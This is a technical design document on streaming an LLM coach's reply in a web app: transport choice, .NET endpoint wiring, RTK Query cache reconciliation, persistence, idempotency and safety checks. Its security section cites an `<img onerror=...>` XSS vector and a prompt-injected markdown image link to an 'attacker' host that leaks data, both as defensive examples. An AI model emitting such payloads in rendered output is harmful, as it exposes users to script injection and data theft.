# Streaming the LLM Coach Response in RunCoach Slice 4: An End-to-End Design

## TL;DR
- **Use SSE-over-`fetch` (POST, manual `ReadableStream` parse) as the transport, served from a .NET 10 controller/minimal endpoint that pipes `IChatClient.GetStreamingResponseAsync` straight to the wire with buffering disabled and `HttpContext.RequestAborted` propagated to the Anthropic call.** This sidesteps the EventSource cookie/header limitation, keeps CookieOrBearer working unchanged, and leaves a clean path for the future iOS bearer client.
- **Do NOT push tokens through RTK Query's cache.** Stream the in-flight turn into local React state via `fetch` + reader, then reconcile the completed, server-authoritative turn into the existing `getConversationTurns` cache with `api.util.upsertQueryData`/`updateQueryData` (no refetch, no flash, no duplicate). RTK Query's `onCacheEntryAdded` is documented for WebSocket-style discrete record updates, not per-token streams.
- **Posture: pre-call SafetyGate + abort-only mid-stream + post-stream async judge; persist the assistant turn once, on completion, via Marten `FetchForWriting` guarded by the existing `IIdempotencyStore`.** Mid-stream red-line splicing is a real but advanced pattern (NeMo Guardrails, OpenAI Guardrails); for a solo dev the practical posture is buffer-nothing, abort on violation, render partial + retry on failure. This design is neutral to the plan-scoped-vs-user-scoped stream decision.

## Key Findings

1. **Transport: SSE framing over `fetch`+`ReadableStream` wins.** The native `EventSource` browser API cannot set an `Authorization` header and only supports GET with no request body — both disqualifying for a POST-with-JSON coaching turn that must also serve a future bearer client. Reading an SSE-framed (`text/event-stream`) response body via `fetch` + `response.body.getReader()` removes both limits while keeping the simple, proxy-friendly, HTTP-native SSE wire format. WebSocket and SignalR add bidirectional machinery, a handshake that enterprise proxies frequently break, and (for SignalR) a client library, a Hub protocol, and sticky-session/backplane requirements — all unjustified for a single unidirectional token stream.

2. **RTK Query is genuinely not stream-native — and the maintainers' own docs confirm it.** The official "Streaming Updates" page scopes the `onCacheEntryAdded` feature to "persistent queries" that "establish an ongoing connection to the server (typically using WebSockets)" applying "updates to the cached data as additional information is received" — i.e. discrete record-level updates (new entries, changed properties), dispatched as Immer diff-patches. Per-token appends would dispatch a Redux action + root-reducer pass + Immer diff + subscriber notification *per token*. The maintained 2026 idiom is: raw `fetch`/`ReadableStream` → local component state for the live turn; RTK Query owns only the durable history.

3. **Server pipeline is a near-trivial pass-through in .NET 10.** `IChatClient.GetStreamingResponseAsync(...)` already returns `IAsyncEnumerable<ChatResponseUpdate>`; the existing `SanitizationAuditChatClient : DelegatingChatClient` already implements it. Expose it through `ICoachingLlm`, then `await foreach` over it in the endpoint, writing `data: {json}\n\n` frames and calling `Response.Body.FlushAsync()` after each. `HttpContext.RequestAborted` flows as the `CancellationToken` into the streaming call, so a client disconnect aborts the upstream Anthropic request and stops token billing.

4. **Persist once, on completion, idempotently.** Append the user turn first (or atomically with the request), then append the assistant turn after the stream completes, using Marten `FetchForWriting<T>` + `SaveChangesAsync` (optimistic concurrency) guarded by the client-GUID `IIdempotencyStore`. On mid-stream death: discard or persist an explicitly `errored`/`partial` turn — do not persist a silent partial as if complete.

5. **Safety: pre-call gate + abort-only mid-stream + post-stream judge is the right solo-dev posture.** Mid-stream deterministic red-line checking (buffer to sentence boundary, abort/splice on banned sequence) is a real production pattern in dedicated guardrail frameworks, but corrective *splicing* mid-stream is generally abandoned in favor of *abort* because earlier fragments are already delivered to the client.

6. **Auth + gotchas: CookieOrBearer works over `fetch` streaming unchanged, but buffering will silently kill the stream.** The `__Host-` cookie rides along automatically on a same-origin `fetch` (`credentials: 'include'`); antiforgery requires the POST to carry the request token header. The silent killers are response buffering at Kestrel/middleware (response compression buffers the whole body), and reverse-proxy/CDN buffering.

## Details

### 1. Transport — SSE-over-fetch, justified against the alternatives

For a single, unidirectional, server→client token stream per turn, the candidates are SSE (via native `EventSource`), SSE-framing-over-`fetch`, chunked/NDJSON-over-`fetch`, WebSocket, and SignalR.

**The EventSource cookie path works but is a dead end here.** Because the SPA uses a `__Host-`-prefixed session cookie, a native `new EventSource('/api/...', { withCredentials: true })` *would* authenticate — the browser attaches the cookie automatically, sidestepping the "EventSource can't set Authorization" problem. But native `EventSource` is **GET-only with no request body**, so you'd have to encode the coaching turn (plan id, user message, idempotency GUID) into the query string (≈2,000-char URL cap), and you'd have **no way to send a bearer token** for the future iOS client. That forecloses the bearer path the stack explicitly reserves.

**SSE-framing over `fetch` + `ReadableStream` is the recommendation.** You keep the dead-simple `text/event-stream` wire format (`data: ...\n\n`), but gain POST + JSON body + arbitrary headers. The cookie still rides automatically with `credentials: 'include'`; the future iOS client sets `Authorization: Bearer ...` on the same `fetch`. This is exactly what modern AI chat clients do — the widely-used `@microsoft/fetch-event-source` library exists precisely to add POST/headers/retry to SSE, and you can either adopt it or hand-roll the ~15-line reader loop. **Recommendation: hand-roll the reader for the single coaching endpoint** (one dependency fewer for a solo dev), keeping `@microsoft/fetch-event-source` as a fallback if you later want its auto-reconnect/Last-Event-ID handling.

Why not the others:
- **WebSocket** — bidirectional, requires an HTTP→WS upgrade handshake that "many enterprise proxies break," and brings frames/ping-pong/close-handshake complexity for zero benefit on a one-way stream.
- **SignalR** — powerful but heavy: Hub protocol, mandatory client library, and "sticky sessions or a backplane (like Redis) for scaling." It is the right tool for bidirectional or massive fan-out, not a single coach reply.
- **Raw chunked/NDJSON over fetch** — essentially equivalent to SSE-over-fetch on the wire; choosing the SSE `data:`/`event:` framing buys you a standard, debuggable format, optional event types (`token`, `done`, `error`), and future `Last-Event-ID` resume semantics for free.

.NET 10 also ships first-class `TypedResults.ServerSentEvents(IAsyncEnumerable<...>)` and `System.Net.ServerSentEvents` (`SseItem<T>`, `SseFormatter`, `SseParser`). This is convenient for GET-style EventSource consumers, but because we need POST + the client reads the body manually, you can either use `TypedResults.ServerSentEvents` on a POST endpoint or simply write SSE frames by hand. Note a real .NET 10 bug: in **minimal APIs**, returning a bare `IAsyncEnumerable<T>` gets its content-type overwritten to `application/json` by the JSON formatter — this is dotnet/aspnetcore issue #60965, titled verbatim *"In Minimal API Content-type of the response is overriden with application/json making it unusable for SSE,"* where the reporter notes the content type "gets overwritten in `HttpResponseJsonExtensions`." So use `TypedResults.ServerSentEvents(...)` explicitly, or write frames to `Response.Body` directly, rather than relying on returning the enumerable.

**Browser support (2026):** SSE/`fetch`/`ReadableStream` are universally supported across modern browsers including mobile Safari. HTTP/2 multiplexing removes the legacy "6 connections per origin" limit that historically pushed teams to WebSocket.

### 2. RTK Query integration — local state for the live turn, `upsertQueryData` to reconcile

**Option (a): `onCacheEntryAdded` streaming-updates.** The official docs describe this as for "persistent queries" using "an ongoing connection to the server (typically using WebSockets)," applying discrete updates such as "new entries being created, or important properties being updated" via an Immer-powered `updateCachedData` draft that "dispatch[es] an action that applies a diffed patch." This is architecturally a WebSocket/subscription feature. Community evidence is explicit that it is awkward for token streaming: in reduxjs/redux-toolkit issue #3607 (*"How to get stream OpenAI response back directly to the users with RTK query?"*, opened Jul 20, 2023 by Demi-Wang), the reporter states: *"I can get entire content showed up at once, instead of streaming it chunk by chunk. But if I use fetch directly, typewring effect works well."* Issue #3701 notes mutation `onCacheEntryAdded` "has no access to updateCachedData," forcing a quirky `queryFn: () => ({ data: null })` workaround. **Rejected for the live token stream.**

**Option (c): streaming-aware custom `baseQuery`.** Over-engineering for one endpoint. A custom `baseQuery` (or `fakeBaseQuery` + `onCacheEntryAdded`) could in principle drive the stream, but it inherits all the per-token-dispatch overhead of (a) and complicates the single most important async path in the app. **Rejected.**

**Option (b): raw `fetch` + `ReadableStream` reader + local React state — RECOMMENDED.** Keep the entire rest of the app on RTK Query. For the in-flight turn, a `useCoachStream` hook does the `fetch`, reads `response.body.getReader()`, decodes SSE frames, and appends tokens to a local `useState` string. The component renders `[...historyFromRTKQuery, { role:'assistant', text: liveText, streaming:true }]`.

**Reconciliation — the critical part.** When the stream's `done` event arrives (or the reader closes), the server has by then appended the authoritative assistant turn to Marten. To make the panel show stable, server-authoritative history with **no flash, no duplicate, no lost turn**:

- The recommended primitive is **`api.util.upsertQueryData('getConversationTurns', planId, finalTurns)`** — or `updateQueryData` to splice the single completed turn into the cached list. The docs state `upsertQueryData` "creates or replaces cache entries": "If no cache entry for that cache key exists, a cache entry will be created and the data added. If a cache entry already exists, this will overwrite the existing cache entry data," and it runs `transformResponse`. Crucially it writes directly into the cache **without a network round-trip**, so there is no loading flash.
- Because `upsertQueryData` is a full replacement (it "does not have access to the previous state of the cache entry"), prefer **`updateQueryData`** (Immer patch) when you only need to append/replace the one new turn inside the existing list. Use the `done` event to carry the final server turn id/version so the local optimistic turn is swapped for the canonical one by id (dedupe key), eliminating duplicates.
- **Do the upsert exactly once per turn, never per token.** Maintainer Mark Erikson warns (Discussion #4643, *"Performance issues with upsertQueryData, makes UI hang"*): *"upsertQueryData uses the normal async thunk flow, which involves dispatching a separate pending and fulfilled action for each item. That also means 2 * N calls to the Redux store root reducer, all the Immer immutable update logic, and calling all the store subscribers afterwards."* That's fine once per completed turn, pathological per token.
- The existing `Conversation` tag invalidation on workout-log create still works untouched; you simply avoid a *blanket* invalidate-and-refetch on stream completion (which would cause the flash). If you prefer maximal correctness over the tiny flash, invalidate-and-refetch is the simpler fallback, but optimistic-merge-by-id is the better UX.

**Version note:** This pattern needs nothing exotic — `upsertQueryData`/`updateQueryData` have been stable since RTK 1.9/2.0.

### 3. Server pipeline — wiring `IAsyncEnumerable<ChatResponseUpdate>` to the wire

Steps for a solo dev:

1. **Add a streaming method to `ICoachingLlm`** that returns `IAsyncEnumerable<string>` (or `IAsyncEnumerable<ChatResponseUpdate>`), implemented by delegating to the existing `SanitizationAuditChatClient.GetStreamingResponseAsync(...)`. This is the one net-new adapter seam. `Microsoft.Extensions.AI` provides `ToChatResponseAsync(IAsyncEnumerable<ChatResponseUpdate>)` to compose the updates back into a single `ChatResponse` for persistence — use it to assemble the final text server-side.

2. **Endpoint shape.** Both minimal APIs and controllers support streaming `IAsyncEnumerable` in .NET 10. Given the existing controller-based stack and CookieOrBearer policy, a controller action is the path of least resistance:
   - Set `Response.ContentType = "text/event-stream"`, `Cache-Control: no-cache, no-transform`, `Connection: keep-alive`, and `X-Accel-Buffering: no`.
   - Disable buffering: `HttpContext.Features.Get<IHttpResponseBodyFeature>()?.DisableBuffering();`
   - `await Response.StartAsync()` to flush headers immediately.
   - `await foreach (var update in coachingLlm.StreamAsync(messages, HttpContext.RequestAborted)) { await Response.WriteAsync($"data: {JsonSerializer.Serialize(new { text = update })}\n\n"); await Response.Body.FlushAsync(); }`
   - Emit a final `data: {"done":true,"turnId":...}\n\n` sentinel.

3. **Content negotiation.** Avoid returning a bare `IAsyncEnumerable<T>` from a minimal API (content-type gets overwritten to `application/json`, #60965). Writing frames manually or using `TypedResults.ServerSentEvents` avoids this.

4. **Cancellation → cost control.** `HttpContext.RequestAborted` "is cancelled when the client disconnects." Passing it into `GetStreamingResponseAsync` flows it to the Anthropic SDK (whose `CreateStreaming`/`IChatClient` honor `CancellationToken`), aborting the upstream call so "we stop paying for tokens nobody is reading." Catch `OperationCanceledException when RequestAborted.IsCancellationRequested` and treat as a normal client-gone, not an error. (Caveat: under IIS/in-process hosting historically the disconnect signal could be unreliable; on Kestrel/Linux it is prompt.)

5. **Disable compression for this endpoint.** `app.MapControllers()....DisableResponseCompression()` (or exclude `text/event-stream` from `ResponseCompressionOptions.MimeTypes`). Response-compression middleware "buffers the entire response to compress it," which defeats streaming.

### 4. Persistence reconciliation — append-on-complete, idempotent

**When to append:** After the full stream completes. Streaming tokens are a transport/UX concern; the event-sourced record is the *result*. Incremental per-token event appends would pollute the stream with hundreds of micro-events and fight Marten's inline projection. Assemble the final assistant text from the `ChatResponseUpdate` sequence (via `ToChatResponse`) and append one `AssistantTurnAdded` event.

**User turn vs. assistant turn ordering:** Append the **user turn first**, durably, before (or atomically at the start of) the LLM call — it must survive even if the assistant stream dies. Two clean options:
- *Two appends:* persist `UserTurnAdded` in the request handler before streaming; append `AssistantTurnAdded` on completion. Simpler; a dead stream leaves a user turn with no answer (which the client can offer to retry).
- *One append on completion:* hold the user turn in memory and append both events together when the assistant completes. Cleaner atomicity but loses the user turn on crash. **Prefer the two-append approach** for auditability and retryability.

**Idempotency under retry/replay:** The client generates a GUID per send and includes it on both the initial request and any retry. The endpoint checks `IIdempotencyStore` keyed on that GUID:
- If a turn for the GUID already exists/completed, return the existing turn (or its stream) rather than re-calling Anthropic — content-derived/stable idempotency keys are the documented way to keep retries from double-submitting LLM calls and double-billing.
- Use Marten `FetchForWriting<ConversationLogView>(planId)` → append → `SaveChangesAsync()`; the optimistic-concurrency check throws `ConcurrencyException` on a concurrent writer, which you convert to "already handled / reload."
- Store an explicit `in_flight` state on the idempotency key so a retry arriving mid-generation gets a 409/"in progress" rather than racing a second Anthropic call.

**Failure semantics (stream dies mid-way):**
- **Recommended:** persist a turn marked `errored` (optionally retaining the partial text for audit) **or** discard entirely and leave only the user turn — both are defensible. Do **not** silently persist a partial as if it were a complete coaching answer (safety/quality risk: a coaching reply truncated mid-sentence could read as dangerously incomplete advice).
- **What the client sees on reload after mid-stream death:** because the assistant turn was never committed as complete, `getConversationTurns` returns the user turn plus (if you persisted it) an `errored` assistant placeholder. The UI renders the user message and a "the coach didn't finish — retry?" affordance. The retry reuses the same idempotency GUID semantics (new logical attempt = new GUID; network retry of the same attempt = same GUID).

### 5. Mid-stream safety + error UX

**Is mid-stream deterministic red-line checking a real production pattern?** Yes — dedicated guardrail stacks do it. NVIDIA NeMo Guardrails validates the stream in chunks against a sliding token-window buffer, using a default `chunk_size` of 200 tokens and `context_size` of 50 tokens; per NVIDIA's Technical Blog *"Stream Smarter and Safer,"* "validation uses a sliding window buffer of recent tokens (configurable via `context_size`) (default 50 tokens)... the Guardrails service starts analyzing content only when the buffer reaches the configured chunk size." Guardrails AI takes the sentence-boundary approach — per its streaming docs, "by default, validators wait until they have accumulated a sentence's worth of content from the LLM before running validation. Once they've run validation, they emit that result in real time." OpenAI's Guardrails offers a streaming mode but defaults to non-streaming ("safe and reliable") because full output is needed for reliable judgment; VoltAgent supports per-chunk transform/abort; and academic work (StreamGuard, FineHarm streaming monitors) shows partial detection requires *purpose-trained* models, not full-sequence classifiers applied to prefixes. The recurring, important finding: **corrective *splicing* mid-stream is generally abandoned in favor of *abort*** — once earlier fragments are delivered, you cannot un-say them, so the practical move on a banned token sequence is to abort the stream and replace it with a refusal.

**Recommended posture for RunCoach (solo dev):**
- **Pre-call:** keep Slice 3's deterministic `SafetyGate` keyword classifier on user input (cheapest, highest-leverage).
- **Mid-stream:** **abort-only.** Optionally run a lightweight deterministic red-line check on a small rolling buffer (to a sentence/whitespace boundary) and, on a hard banned sequence, abort the upstream call and emit an `event: error` / refusal frame. Do **not** attempt corrective splicing.
- **Post-stream:** run the heavier safety/quality judge **asynchronously** after persistence (the POST-call judge Slice 3 anticipated). If it flags the persisted turn, mark it (e.g., `redacted`/`flagged`) via a follow-up event so the next read reflects the correction — this fits event sourcing naturally.

**LLM-failure-mid-stream client UX:** Render the partial that already arrived (don't blank it — that's jarring), surface a clear "the coach was interrupted — Retry" affordance, and make the retry idempotent (same GUID for the same logical attempt). On `event: error`, show an inline non-destructive error under the partial text.

### 6. Auth + gotchas

**CookieOrBearer over the chosen transport — confirmed working.** Because we use `fetch` (not native `EventSource`), the `__Host-` session cookie is sent automatically on a same-origin request with `credentials: 'include'`, and the future iOS client sets `Authorization: Bearer`. The CookieOrBearer policy authenticates the streaming POST exactly like any other API call. **Antiforgery:** the streaming POST is a state-changing request, so it must carry the antiforgery request-token header (the same way the rest of the SPA's writes do). The `__Host-` antiforgery cookie is `SameSite=Strict; HttpOnly` and is bound to the authenticated user. If — and only if — you adopt bearer-only auth for an endpoint (no cookie), antiforgery is unnecessary and you'd `DisableAntiforgery()`; for the cookie SPA, keep it on.

**Silent stream-killers to design against:**
- **Kestrel/middleware buffering.** Kestrel does not buffer response bodies by default, but **response-compression middleware buffers the whole body to compress it** — exclude `text/event-stream` or call `DisableResponseCompression()` on the endpoint. Also call `IHttpResponseBodyFeature.DisableBuffering()` and `FlushAsync()` after every frame.
- **Reverse-proxy / CDN buffering.** Nginx defaults to `proxy_buffering on`; fix with `proxy_buffering off; proxy_cache off;` on the SSE location and/or emit `X-Accel-Buffering: no` from the app (which the playbook recommends as a belt-and-suspenders header). YARP: don't enable `AllowResponseBuffering`. Azure APIM: `buffer-response="false"` and don't log bodies. Azure App Service: `WEBSITE_DISABLE_HTTP_COMPRESSION=1`. Symptom of getting this wrong: real-time on localhost, "batched then dumped all at once" in production.
- **HTTP/1.1 vs HTTP/2.** Prefer HTTP/2 end-to-end: it multiplexes streams over one connection, eliminating the 6-connections-per-origin cap that can starve other requests when an SSE stream is held open. SSE works on both; HTTP/2 just scales better behind a load balancer.
- **Heartbeats.** For long pauses (model "thinking"), emit a comment line (`:\n\n`) every ~15–30s so intermediary proxies/load balancers don't idle-timeout the connection.

**Sanitization interplay with streamed, user-influenced output — a genuine security concern.** The assistant text can echo user-influenced / prompt-injected content, and you are rendering it token-by-token as markdown. Key rules (from react-markdown, rehype-sanitize, and Vercel Labs' markdown-sanitizers guidance):
- **Never use `dangerouslySetInnerHTML`** or a raw-HTML markdown renderer (`marked`→innerHTML) for LLM output — that bypasses React's escaping and is the classic markdown-XSS vector (e.g. `<img onerror=...>`).
- **`react-markdown` is "safe by default (no dangerouslySetInnerHTML or XSS attacks)"** and ignores raw HTML unless you opt into `rehype-raw`. **Do not add `rehype-raw`.** If you ever must, you "re-enter XSS territory" and must pair it with `rehype-sanitize` (which must run *after* raw parsing).
- **Treat LLM markdown as untrusted** (Vercel Labs: "Never assume LLM or user-generated markdown is safe by default"). Even with raw HTML off, markdown links/images still render — a prompt-injected `![](http://attacker/leak?data=...)` is a data-exfiltration vector. Mitigate with URL allow-listing (`harden-react-markdown`/`rehype-harden`) and keep react-markdown's default `urlTransform` (it neutralizes `javascript:`/`vbscript:`/`file:`). Add a CSP as backstop.
- **For per-token rendering:** re-run react-markdown's safe AST→React-element render on the growing string each frame (React diffs only what changed). Avoid sanitizing-then-appending raw tokens: any sanitization must be the *last* step before render. With raw HTML disabled, partial/unclosed markdown fails safe as literal text, which is exactly what you want mid-stream.
- The existing `SanitizationAuditChatClient` already sits in the streaming path — keep its sanitization on the inbound prompt and any audit of outbound content, but the **rendering-side** XSS defense (no raw HTML, URL allow-list, CSP) is the layer that actually stops streamed-content attacks.

## Recommendations

**Stage 1 — Make the stream work end-to-end (the spike):**
1. Expose `GetStreamingResponseAsync` through a new `ICoachingLlm.StreamAsync(...)` returning `IAsyncEnumerable`, delegating to the existing `SanitizationAuditChatClient`.
2. Add a controller POST endpoint: set SSE headers + `X-Accel-Buffering: no`, `DisableBuffering()`, `StartAsync()`, `await foreach` writing `data:` frames + `FlushAsync()`, pass `HttpContext.RequestAborted`, emit `done` sentinel. Exclude it from response compression.
3. Client: `useCoachStream` hook doing `fetch(..., { method:'POST', credentials:'include', headers:{ 'X-CSRF-TOKEN': token } })`, read `getReader()`, append tokens to local state, render with `react-markdown` (no `rehype-raw`).
4. **Benchmark that changes the plan:** if tokens arrive batched (not incremental) in your deployed environment, the culprit is buffering — verify Kestrel/compression first, then the proxy/CDN (`X-Accel-Buffering`, `proxy_buffering off`).

**Stage 2 — Persistence + idempotency:**
5. Append `UserTurnAdded` before streaming; append `AssistantTurnAdded` on completion via `FetchForWriting` + `SaveChangesAsync`, guarded by `IIdempotencyStore` on the client GUID with an `in_flight` state.
6. On the `done` event, carry the canonical turn id/version; reconcile with `api.util.updateQueryData`/`upsertQueryData` (merge-by-id, once) — no blanket invalidate-and-refetch.
7. On mid-stream death: persist `errored` (or discard); client renders partial + idempotent Retry.

**Stage 3 — Safety hardening:**
8. Keep pre-call SafetyGate; add abort-only mid-stream check on a rolling buffer; add async post-stream judge that can flag/redact the persisted turn via a follow-up event.
9. Lock down rendering: URL allow-list, CSP, confirm `rehype-raw` is absent.

**Thresholds that change the recommendation:**
- *If you later need bidirectional interaction* (user interrupts/steers mid-generation, live voice): revisit WebSocket/SignalR.
- *If you need cross-device stream resume* (user reloads and wants the same in-flight stream): add SSE `id:`/`Last-Event-ID` replay (the .NET 10 `SseItem<T>` + buffer pattern) or a managed token-streaming transport.
- *If per-token Redux dispatch ever becomes desirable* (e.g. multiple subscribers to the live turn): reconsider, but it almost certainly won't for one panel.

## Version Pins (minimums for this pattern)
- **.NET / ASP.NET Core 10** (GA) — required for native `TypedResults.ServerSentEvents` / `System.Net.ServerSentEvents`; the manual-frame approach works on 8+, but you're already on 10. C# 14.
- **Microsoft.Extensions.AI 10.7.0** (GA; last updated 6/9/2026 per NuGet Gallery, ~16.8M total downloads; companion `Microsoft.Extensions.AI.OpenAI` at 10.6.0, updated 5/12/2026). The `IChatClient.GetStreamingResponseAsync` / `ChatResponseUpdate` / `DelegatingChatClient` / `ToChatResponse` surface you rely on is in the GA abstractions.
- **Anthropic .NET SDK** — the official `Anthropic` 12.8.0 package, described on NuGet as "The official .NET library for the Anthropic API," exposing `Messages.CreateStreaming(...)` → `IAsyncEnumerable` (with `CancellationToken` support) and an `IChatClient` via `client.AsIChatClient("claude-haiku-4-5")`; or the community `Anthropic.SDK` 5.10.0 (supporting Claude Opus 4.6 / Sonnet 4.6) if you're on that client. Either works behind `Microsoft.Extensions.AI`.
- **Redux Toolkit / RTK Query 2.x** (current 2.10+; `upsertQueryData`/`updateQueryData` stable since 1.9/2.0). **React-Redux 9.x** (requires React 18+, accepts React 19).
- **React 19** (GA) + **TypeScript 5.x strict** (RTK officially tests against TS, with early TS 7.0/tsgo validation underway).
- **react-markdown** (latest; safe-by-default, no `rehype-raw`), optional **rehype-sanitize** / **harden-react-markdown** for URL allow-listing.

## Caveats
- **The RTK-Query-plus-token-streaming combination is the genuinely unsettled part of the ecosystem.** There is no first-class RTK Query token-streaming primitive in 2026; the recommendation here (local state for the live turn, cache reconciliation on completion) is the prevailing community/maintainer idiom, not an official "streaming chat" API. Treat any future first-class RTKQ streaming support as a reason to revisit.
- **Mid-stream safety is an active research area.** Partial-detection moderation that's reliable needs purpose-trained models; the deterministic keyword/red-line buffer recommended here is a pragmatic floor, not a guarantee. The async post-stream judge is where real safety judgment belongs.
- **`HttpContext.RequestAborted` reliability is hosting-dependent.** It's prompt on Kestrel/Linux; historically IIS in-process hosting could delay or miss the client-disconnect signal — verify in your actual deployment that an aborted client really cancels the Anthropic call (watch token usage).
- **Idempotency for LLM calls is "same action, not same output."** Because generation is non-deterministic, the idempotency guarantee is on the *persisted turn / side effect* (one assistant turn per logical send), not on byte-identical text. Cache and return the already-persisted turn on retry rather than regenerating.
- **The plan-scoped-vs-user-scoped projection decision is NOT constrained by this design.** The streaming transport, the local-state client pattern, the persist-on-complete append, and the idempotency store are all keyed by `planId` (or whatever stream id you choose) and are agnostic to whether the read-model projection is ultimately keyed per-plan or per-user. The recommended pattern is **neutral** to that adjacent decision: you can re-key the projection later without touching the streaming pipeline.
